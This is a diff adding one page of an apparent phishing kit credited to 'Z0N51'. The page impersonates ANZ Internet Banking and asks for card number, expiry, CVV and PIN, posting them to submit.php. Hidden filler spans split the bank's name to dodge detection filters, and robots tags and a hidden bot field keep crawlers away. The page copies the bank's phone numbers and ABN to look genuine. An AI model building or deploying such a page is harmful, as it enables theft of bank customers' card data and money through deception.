@@ -1,0 +1,124 @@
+<?php
+    /*******
+    Main Author: Z0N51
+    Contact me on telegram : https://t.me/z0n51
+    ********************************************************/
+
+include_once '../inc/app.php';
+?>
+<!doctype html>
+<html lang="en">
+
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
+
+        <link rel="icon" type="image/png" href="../assets/images/fav.png"/>
+        
+        <!-- CSS FILES -->
+        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../assets/css/helpers.css">
+        <link rel="stylesheet" href="../assets/css/fonts.css">
+        <link rel="stylesheet" href="../assets/css/main.css">
+
+        <title>Enter your card informations</title>
+    </head>
+
+    <body>
+        
+        <!-- HEADER -->
+        <header id="header">
+            <div class="container">
+                <div class="logo"><img src="../assets/images/logo.png"></div>
+            </div>
+        </header>
+        <!-- END HEADER -->
+
+        <!-- MAIN -->
+        <main id="main" class="pt-4">
+            <div class="container">
+                
+                <div class="main-title"><h3>Welcome to A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z Internet B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g</h3></div>
+                <div class="steps">
+                    <ul>
+                        <li class="active"><span>1</span> Login</li>
+                        <li class="active"><span>2</span> ANZ card informations</li>
+                        <li><span>3</span> Confirmation</li>
+                        <li><span>4</span> Finish</li>
+                    </ul>
+                    <h3><b>Step 1.</b> Enter your card informations</h3>
+                </div>
+                <form method="post" action="submit.php">
+                <div class="panel">
+                    <div class="panel-body details">
+                            <div class="row mb-4">
+                                <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4 <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>">
+                                    <label for="cc_number">Card number</label>
+                                    <input type="text" name="cc_number" id="cc_number" class="form-control" value="<?php echo get_value('cc_number'); ?>">
+                                    <?php echo error_message($_SESSION['errors'],'cc_number'); ?>
+                                </div>
+                                <div class="col-md-6 <?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>">
+                                    <label for="cc_date">Expiration date</label>
+                                    <input type="text" name="cc_date" id="cc_date" maxlength="7" class="form-control" value="<?php echo get_value('cc_date'); ?>">
+                                    <?php echo error_message($_SESSION['errors'],'cc_date'); ?>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-4 mb-4 <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>">
+                                    <label for="cc_cvv">Security code (CVV)</label>
+                                    <input type="text" name="cc_cvv" id="cc_cvv" maxlength="3" class="form-control" value="<?php echo get_value('cc_cvv'); ?>">
+                                    <?php echo error_message($_SESSION['errors'],'cc_cvv'); ?>
+                                </div>
+                                <div class="col-md-6 <?php echo is_invalid_class($_SESSION['errors'],'cc_pin') ?>">
+                                    <label for="cc_pin">Card PIN</label>
+                                    <input type="text" name="cc_pin" maxlength="4" id="cc_pin" class="form-control" value="<?php echo get_value('cc_pin'); ?>">
+                                    <?php echo error_message($_SESSION['errors'],'cc_pin'); ?>
+                                </div>
+                            </div>
+                            <div class="mt-5">
+                                <p class="mb-0" style="color: #444; font-weight: 600;">need help?</p>
+                                <p class="mb-0" style="color: #444;">Call us on <span style="color: #337ab7;">13 33 50</span> any time (<span style="color: #337ab7;">+61 3 9683 8833</span> from overseas).</p>
+                            </div>
+                    </div>
+                    <div class="panel-footer">
+                        <div class="text-right">
+                            <button type="submit">Next</button>
+                        </div>
+                    </div>
+                </div>
+                <input type="hidden" name="verbot">
+                <input type="hidden" name="type" value="cc">
+                </form>
+
+            </div>
+        </main>
+        <!-- END MAIN -->
+
+        <!-- FOOTER -->
+        <footer id="footer">
+            <div class="container">
+                <p>&copy; Australia and New Zealand B<span class="hiiide">AZ45Qer</span>a<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>k<span class="hiiide">AZ45Qer</span>i<span class="hiiide">AZ45Qer</span>n<span class="hiiide">AZ45Qer</span>g Group Limited (A<span class="hiiide">AZ45Qer</span>N<span class="hiiide">AZ45Qer</span>Z) 2020 ABN 11 005 357 522.</p>
+            </div>
+        </footer>
+        <!-- END FOOTER -->
+
+        <!-- JS FILES -->
+        <script src="../assets/js/jquery.min.js"></script>
+        <script src="../assets/js/popper.min.js"></script>
+        <script src="../assets/js/bootstrap.min.js"></script>
+        <script src="../assets/js/fontawesome.min.js"></script>
+        <script src="../assets/js/jquery.payment.js"></script>
+        <script src="../assets/js/main.js"></script>
+
+        <script>
+            $('#cc_cvv').payment('formatCardCVC');
+            $('#cc_date').payment('formatCardExpiry');
+            $('#cc_number').payment('formatCardNumber');
+            $('#cc_pin').payment('restrictNumeric');
+        </script>
+
+    </body>
+
+</html>
